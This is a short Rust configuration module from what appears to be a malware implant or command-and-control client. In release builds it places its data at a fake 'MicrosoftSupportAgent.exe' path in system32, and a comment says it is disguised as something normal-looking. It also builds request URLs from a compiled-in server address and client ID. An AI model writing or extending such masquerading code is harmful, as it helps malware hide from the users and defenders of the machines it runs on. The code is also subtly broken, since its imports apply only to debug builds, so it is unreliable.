pub mod paths {
    #[cfg(debug_assertions)]
use std::{path::{Path, PathBuf}, sync::LazyLock};

    #[cfg(not(debug_assertions))]
    pub const DATA: LazyLock<PathBuf> = LazyLock::new(|| PathBuf::from("C:/Windows/system32/MicrosoftSupportAgent.exe")); // we discuise our self as somthing normal looking

    #[cfg(debug_assertions)]
    pub static DATA: LazyLock<PathBuf> = LazyLock::new(|| PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/test_data/simcc_data")));
}

pub mod compiled {
    pub const URL: &'static str = env!("SIMCC_URL");
    pub const CCID: &'static str = env!("CCID");
    pub fn SIMCC_URL(path: &str) -> String {
        let mut complete_url = String::from(URL);
        complete_url.push_str(path);
        complete_url
    }
}

